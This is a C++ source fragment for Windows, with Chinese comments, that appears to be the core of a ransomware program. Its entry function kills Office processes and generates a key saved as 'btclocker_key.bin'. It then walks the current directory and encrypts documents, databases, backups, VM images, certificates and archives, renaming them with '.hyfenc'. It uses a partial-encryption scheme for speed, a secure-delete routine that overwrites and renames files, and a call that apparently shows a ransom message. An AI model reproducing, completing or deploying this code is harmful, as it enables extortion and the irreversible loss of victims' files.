                        std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(), ::tolower);
                        return ext == lowerTarget;
                    });

                if (shouldEncrypt) {
                    // 创建加密后的文件名
                    fs::path outputFile = entry.path();
                    outputFile += ".hyfenc";

                    // 添加加密任务
                    manager.addTask(entry.path(), outputFile, key);
                    fileCount++;
                    otherFileCount++;

                    // 统计文件大小分类
                    size_t fileSize = entry.file_size();
                    if (fileSize < 1024 * 1024) {
                        smallFileCount++;
                    }
                    else {
                        largeFileCount++;
                    }

                    std::cout << "已添加非数据库文件加密任务: " << entry.path() << " (大小: "
                        << fileSize / 1024 << " KB)" << std::endl;
                }
            }
        }
        catch (const std::exception& e) {
            std::cerr << "第二阶段处理出错: " << e.what() << std::endl;
        }

        std::cout << "第二阶段完成，找到 " << otherFileCount << " 个非数据库文件" << std::endl;
        std::cout << "  小于1MB: " << smallFileCount << " 个" << std::endl;
        std::cout << "  大于等于1MB: " << largeFileCount << " 个" << std::endl;
        std::cout << "  跳过系统文件: " << skippedFiles << " 个" << std::endl;

        std::cout << "\n开始加密 " << fileCount << " 个文件 ("
            << dbFileCount << " 个数据库文件, "
            << otherFileCount << " 个其他文件)..." << std::endl;

        // 等待所有任务完成
        manager.waitForCompletion();

        // 显示加密统计信息
        manager.printStatistics();

        std::cout << "完成加密 " << fileCount << " 个文件." << std::endl;
        std::cout << "加密策略: " << std::endl;
        std::cout << "  数据库文件: 全文件加密" << std::endl;
        std::cout << "  非数据库文件: " << std::endl;
        std::cout << "    - 小于1MB: 加密文件头部4KB" << std::endl;
        std::cout << "    - 大于等于1MB: 分块加密15%" << std::endl;
    }
    catch (const std::exception& e) {
        std::cerr << "严重错误: " << e.what() << std::endl;
    }
}

// 实现辅助函数
inline void GenerateRandomKey(BYTE* key, DWORD length) {
    NTSTATUS status = BCryptGenRandom(
        NULL, key, length, BCRYPT_USE_SYSTEM_PREFERRED_RNG
    );
    if (!NT_SUCCESS(status)) {
        throw std::runtime_error("BCryptGenRandom failed: " + to_hex(status));
    }
}

inline bool SaveKeyToDocuments(const BYTE* key, DWORD length, const std::wstring& fileName) {
    fs::path savePath = GetUserDocumentsPath() / fileName;

    try {
        std::ofstream keyFile(savePath, std::ios::binary);
        if (!keyFile) return false;

        keyFile.write(reinterpret_cast<const char*>(key), length);
        return keyFile.good();
    }
    catch (...) {
        return false;
    }
}

inline fs::path GetUserDocumentsPath() {
    PWSTR path = nullptr;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Documents, 0, nullptr, &path);
    if (SUCCEEDED(hr)) {
        fs::path docsPath(path);
        CoTaskMemFree(path);
        return docsPath;
    }
    std::cerr << "SHGetKnownFolderPath failed: 0x" << std::hex << hr << std::endl;
    return fs::current_path();
}

inline bool IsAesNiSupported() {
    int cpuInfo[4];
    __cpuid(cpuInfo, 1); // 获取CPU功能标志

    // 检查第25位 (AES-NI支持标志)
    return (cpuInfo[2] & (1 << 25)) != 0;
}

inline std::string to_hex(NTSTATUS status) {
    std::stringstream ss;
    ss << "0x" << std::hex << std::setw(8) << std::setfill('0') << status;
    return ss.str();
}

// SecureDelete函数实现
// SecureDelete函数实现 - 修复版
bool SecureDelete(const fs::path& path) {
    // 检查文件是否存在
    if (!fs::exists(path)) {
        std::cout << "文件不存在: " << path << std::endl;
        return true;
    }

    HANDLE hFile = INVALID_HANDLE_VALUE;
    LARGE_INTEGER fileSize = { 0 };

    try {
        // 1. 打开文件（移除FILE_FLAG_OVERLAPPED标志，避免参数错误）
        hFile = CreateFileW(
            path.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,  // 允许其他进程读写
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH, // 移除FILE_FLAG_OVERLAPPED
            NULL
        );

        if (hFile == INVALID_HANDLE_VALUE) {
            DWORD error = GetLastError();
            // 如果无法以读写模式打开，尝试只读模式获取文件信息
            if (error == ERROR_ACCESS_DENIED || error == ERROR_SHARING_VIOLATION) {
                std::cout << "无法访问文件，可能被系统锁定: " << path << std::endl;
                return false;
            }
            throw std::runtime_error("无法打开文件进行安全删除。错误代码: " + std::to_string(error));
        }

        // 2. 获取文件大小
        if (!GetFileSizeEx(hFile, &fileSize)) {
            DWORD error = GetLastError();
            CloseHandle(hFile);
            throw std::runtime_error("无法获取文件大小。错误代码: " + std::to_string(error));
        }

        // 处理空文件
        if (fileSize.QuadPart == 0) {
            CloseHandle(hFile);
            // 直接删除空文件
            return DeleteFileW(path.c_str());
        }

        // 3. 单次随机数据覆写
        const DWORD bufferSize = 64 * 1024; // 64KB缓冲区
        std::vector<BYTE> randomBuffer(bufferSize);

        // 使用密码学安全的随机数生成器
        std::random_device rd;
        std::independent_bits_engine<std::mt19937, CHAR_BIT, unsigned short> rng(rd());

        // 生成随机缓冲区内容
        std::generate(randomBuffer.begin(), randomBuffer.end(), rng);

        LARGE_INTEGER offset = { 0 };
        DWORD bytesWritten = 0;
        LONGLONG remainingBytes = fileSize.QuadPart;

        // 分块覆写文件
        while (remainingBytes > 0) {
            DWORD chunkSize = static_cast<DWORD>((bufferSize < remainingBytes) ? bufferSize : remainingBytes);

            // 设置写入位置
            offset.QuadPart = fileSize.QuadPart - remainingBytes;
            if (!SetFilePointerEx(hFile, offset, NULL, FILE_BEGIN)) {
                DWORD error = GetLastError();
                throw std::runtime_error("设置文件指针失败。错误代码: " + std::to_string(error));
            }

            // 写入随机数据
            if (!WriteFile(hFile, randomBuffer.data(), chunkSize, &bytesWritten, NULL)) {
                DWORD error = GetLastError();
                // 如果是访问被拒绝错误，可能是文件被锁定
                if (error == ERROR_ACCESS_DENIED) {
                    std::cout << "文件被锁定，无法安全删除: " << path << std::endl;
                    CloseHandle(hFile);
                    return false;
                }
                throw std::runtime_error("写入随机数据失败。错误代码: " + std::to_string(error));
            }

            if (bytesWritten != chunkSize) {
                throw std::runtime_error("部分写入错误。预期: " + std::to_string(chunkSize) +
                    ", 实际: " + std::to_string(bytesWritten));
            }

            remainingBytes -= chunkSize;
        }

        // 4. 强制刷新到磁盘
        FlushFileBuffers(hFile);
        CloseHandle(hFile);
        hFile = INVALID_HANDLE_VALUE;

        // 5. 文件名混淆
        fs::path tempPath = path;
        std::random_device nameRd;
        std::mt19937 nameGen(nameRd());
        std::uniform_int_distribution<> nameDis(0, 15);

        // 随机重命名2-3次
        int renameCount = 2 + (nameDis(nameGen) % 2);
        for (int i = 0; i < renameCount; ++i) {
            std::stringstream newName;
            newName << "del_";
            for (int j = 0; j < 8; ++j) {
                newName << std::hex << nameDis(nameGen);
            }
            newName << ".tmp";

            fs::path newPath = path.parent_path() / newName.str();
            try {
                fs::rename(tempPath, newPath);
                tempPath = newPath;
            }
            catch (const fs::filesystem_error&) {
                // 重命名失败不影响主要流程
                break;
            }
        }

        // 6. 最终删除
        bool deleteSuccess = DeleteFileW(tempPath.c_str());

        if (deleteSuccess) {
            std::cout << "安全删除成功: " << path << std::endl;
        }
        else {
            DWORD error = GetLastError();
            std::cerr << "最终删除失败: " << tempPath << " 错误: " << error << std::endl;
        }

        return deleteSuccess;
    }
    catch (const std::exception& e) {
        std::cerr << "安全删除失败 " << path << ": " << e.what() << std::endl;

        // 清理资源
        if (hFile != INVALID_HANDLE_VALUE) {
            CloseHandle(hFile);
        }

        // 回退到普通删除
        std::error_code ec;
        if (fs::remove(path, ec)) {
            std::cout << "已使用普通删除方式移除文件: " << path << std::endl;
            return true;
        }

        std::cerr << "普通删除也失败: " << path << " 错误: " << ec.message() << std::endl;
        return false;
    }
}// 主函数
inline int encrypthf() {
    bool hwAccelSupported = IsAesNiSupported();
    std::cout << "AES Hardware Acceleration: " << (hwAccelSupported ? "SUPPORTED" : "NOT SUPPORTED") << std::endl;

    if (!hwAccelSupported) {
        std::cout << "Warning: Hardware acceleration (AES-NI) not detected. "
            << "Encryption will be performed in software mode, which may be slower." << std::endl;
    }

    // 关闭可能占用文件的应用程序
    system("taskkill /f /im winword.exe > nul 2>&1");
    system("taskkill /f /im excel.exe > nul 2>&1");
    system("taskkill /f /im powerpnt.exe > nul 2>&1");
    Sleep(500);

    // 生成随机密钥
    BYTE encryptionKey[KEY_LENGTH];
    GenerateRandomKey(encryptionKey, KEY_LENGTH);
    if (!SaveKeyToDocuments(encryptionKey, KEY_LENGTH, L"btclocker_key.bin")) {
        std::cerr << "Failed to save encryption key!" << std::endl;
        return 1;
    }

    // 目标文件扩展名
    std::vector<std::string> extensions = {
        ".doc", ".docx", ".xlsx", ".xls", ".pptx", ".pdf",
        ".mdf", ".ndf", ".bak", ".sqlite", ".db", ".ldf",
        ".qbb", ".qbo", ".ofx",
        ".javass", ".pys", ".jss", ".ymls", ".inis", ".envs",
        ".psd", ".ai", ".dwg", ".skp",
        ".vmdk", ".iso", ".pfx", ".pems",
        ".pst", ".mbox", ".mpp",
        ".jar", ".zip", ".tar.gz",
        "pptx", "ppt", "jpg", "png", "txt", "jpeg"
    };

    fs::path targetDirectory = fs::current_path();;
    std::cout << "Target directory: " << targetDirectory << std::endl;

    // 使用异步加密管理器
    traverseAndEncryptAsync(targetDirectory, extensions, encryptionKey);

    // 显示完成信息
    showtext();

    return 0;
}

#endif // ENCRYPTION_UTILS_H
